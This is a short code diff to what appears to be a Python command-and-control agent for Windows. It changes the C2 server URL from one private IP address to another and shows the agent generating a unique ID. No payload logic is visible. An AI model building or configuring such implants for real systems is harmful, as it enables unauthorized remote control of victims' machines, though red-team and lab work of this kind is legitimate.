@@ -10,7 +10,7 @@ import win32com.client
 import os
 
 # URL of the C2 server
-SERVER_URL = "http://192.168.31.132:5000"
+SERVER_URL = "http://192.168.30.20:5000"
 
 # Generate a unique agent ID
 AGENT_ID = str(uuid.uuid4())
